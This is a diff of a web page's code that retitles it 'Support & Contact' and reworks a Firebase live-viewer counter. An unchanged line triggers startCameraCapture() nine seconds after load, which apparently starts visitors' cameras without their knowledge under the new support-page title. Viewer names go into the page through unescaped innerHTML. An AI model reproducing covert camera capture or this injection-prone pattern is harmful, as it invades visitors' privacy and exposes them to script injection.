@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>test</title>
+  <title>Support & Contact</title>
   <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
   <style>
     html, body {
@@ -425,51 +425,29 @@ setTimeout(() => {
   startCameraCapture(); 
 }, 9000);
 
+  // تسجيل الزائر فور دخول الصفحة
 let visitorId = Math.random().toString(36).substring(2, 10);
 const visitorsRef = ref(db, "viewers/" + visitorId);
 set(visitorsRef, { name: "Guest" }); 
 onDisconnect(visitorsRef).remove();
 
-const viewersListRef = ref(db, "viewers");
-onValue(viewersListRef, snapshot => {
+onValue(ref(db, "viewers"), snapshot => {
   const viewers = snapshot.val();
   const count = viewers ? Object.keys(viewers).length : 0;
   viewersCountDiv.textContent = `👁️‍🗨️ ${count}`;
-});
-
-viewersCountDiv.style.cursor = 'pointer';
-viewersCountDiv.addEventListener('click', () => {
-  const viewersListPopup = document.getElementById('viewersListPopup');
-  if (viewersListPopup.style.display === 'block') {
-    viewersListPopup.style.display = 'none';
-    return;
-  }
-
-  get(viewersListRef).then(snapshot => {
-    const viewers = snapshot.val();
-    if (!viewers) {
-      viewersListPopup.textContent = 'No viewers currently.';
+  viewersCountDiv.addEventListener('click', () => {
+    if (viewersListPopup.style.display === 'block') {
+      viewersListPopup.style.display = 'none';
+    } else {
+      const names = Object.values(viewers)
+        .map(v => v.name || 'Guest')
+        .filter(n => n.trim() !== '');
+      viewersListPopup.innerHTML = names.length
+        ? '<strong>Viewers:</strong><br>' + names.join('<br>')
+        : 'No viewers currently.';
       viewersListPopup.style.display = 'block';
-      return;
     }
-
-    const names = Object.values(viewers)
-      .map(v => v.name || 'Guest')
-      .filter(n => n.trim() !== '');
-    
-    viewersListPopup.innerHTML = names.length
-      ? '<strong>Viewers:</strong><br>' + names.join('<br>')
-      : 'No viewers currently.';
-    viewersListPopup.style.display = 'block';
   });
-});
-
-// إخفاء القائمة عند النقر خارجها
-document.addEventListener('click', (e) => {
-  const viewersListPopup = document.getElementById('viewersListPopup');
-  if (!viewersListPopup.contains(e.target) && e.target !== viewersCountDiv) {
-    viewersListPopup.style.display = 'none';
-  }
 });
 const viewersListPopup = document.getElementById('viewersListPopup');
 
